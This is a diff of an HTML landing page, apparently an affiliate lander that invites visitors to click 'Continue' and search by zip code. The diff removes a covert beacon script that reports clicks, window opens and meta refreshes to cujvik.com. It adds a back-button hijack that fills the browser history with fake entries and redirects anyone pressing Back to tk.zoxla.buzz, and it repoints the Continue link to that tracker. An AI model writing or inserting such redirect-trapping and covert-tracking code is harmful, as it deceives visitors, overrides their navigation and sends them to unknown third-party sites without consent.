@@ -1,74 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 
-<head><script type="text/javascript">(function (apiUrl, apiData, lpUrl) {
-    var apiFormData = new FormData();
-    for (var i in apiData) {
-        apiFormData.append(i, apiData[i]);
-    }
-
-    function sendBeacon() {
-        navigator.sendBeacon(apiUrl, apiFormData);
-    }
-
-    function ajaxBeacon() {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', apiUrl);
-        xhr.send(apiFormData);
-    }
-
-    function onWindowOpen() {
-        window.open = (function (fnOpen) {
-            return function () {
-                ajaxBeacon();
-                return fnOpen.apply(window, arguments);
-            }
-        })(window.open);
-    }
-
-    function onAnchorClick() {
-        var tags = {a: "href", form: "action"}, tag, action;
-        for (tag in tags) {
-            action = tags[tag];
-            document.querySelectorAll(`${tag}[${action}^="${lpUrl}"],${tag}[${action}^='${lpUrl}']`)
-                .forEach(function (a) {
-                    // на любой клик пытаемся послать ajax
-                    a.addEventListener("click", ajaxBeacon, false);
-                    if ("_blank" !== a.getAttribute('target')) {
-                        // если страница открывается в том же окне, то ajax может не успеть дойти,
-                        // делаем sendBeacon для надёжности
-                        a.addEventListener("click", sendBeacon, false);
-                    }
-                });
-        }
-    }
-
-    function onMetaRefresh() {
-        document.querySelectorAll(`meta[http-equiv="refresh"],meta[http-equiv='refresh']`)
-            .forEach(function ( meta ) {
-                var content = meta.getAttribute('content').split(/;url=/i, 2);
-                var url = content[1];
-                if (0 === url.indexOf(lpUrl)) {
-                    var timeout = parseInt(content[0]) || 0;
-                    if (timeout <= 1) {
-                        sendBeacon();
-                    } else {
-                        setTimeout(function () {
-                            sendBeacon();
-                        }, timeout * 1000 - 1000);
-                    }
-                }
-            });
-    }
-
-    window.addEventListener("DOMContentLoaded", function () {
-        onWindowOpen();
-        onMetaRefresh();
-        onAnchorClick();
-    }, false);
-
-})('https:\/\/cujvik.com\/prelp\/beacon', JSON.parse('{"h":"35f2e3b00302c14a332caded9a648b5a","t":1655975683}'), 'https:\/\/xkt.bizzliving.com\/6rtv3?click_id=3860161355&_sub_aff_id=27765_');
-</script>
+<head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta name="description" content="">
@@ -80,18 +13,18 @@
   style="display: block;  background: url(&#39;files/background.jpg&#39;); background-repeat: no-repeat; background-size: cover"
   data-gr-c-s-loaded="true" class="vsc-initialized">
 
-  <script>
-    !function () {
-      var t;
-      try {
-        for (t = 0; 10 > t; ++t)history.pushState({}, "", "");
-        onpopstate = function (t) {
-          t.state && location.replace("\/\/vidfun.net\/e54afcd2966a6a07f168d60e45003069bc43ee25\/?c=1c515d3441d0df80-9a&h=35f2e3b00302c14a332caded9a648b5a&s=1&lph=1")
-        }
-      }
-      catch (o) { }
+<script type="text/javascript">
+    ! function () {
+        var t;
+        try {
+            const URL = window.location.href.split(/[#]/)[0];
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
+            onpopstate = function(event){
+                event.state && location.replace('https://tk.zoxla.buzz/cuvfl9k.php?lp=1&event10=1');
+            }
+        } catch (o) { console.log( o ); }
     }();
-  </script>
+</script>
 
   <section id="step1">
     <div class="container-fluid">
@@ -498,7 +431,7 @@
               that you never reveal their identity. <br> Click the "Continue" button and search according to your zip
               code</p>
             <p>
-              <a href="https://xkt.bizzliving.com/6rtv3?click_id=3860161355&amp;_sub_aff_id=27765_" class="btnnext button16">
+              <a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1" class="btnnext button16">
                 Continue »
 
               </a>
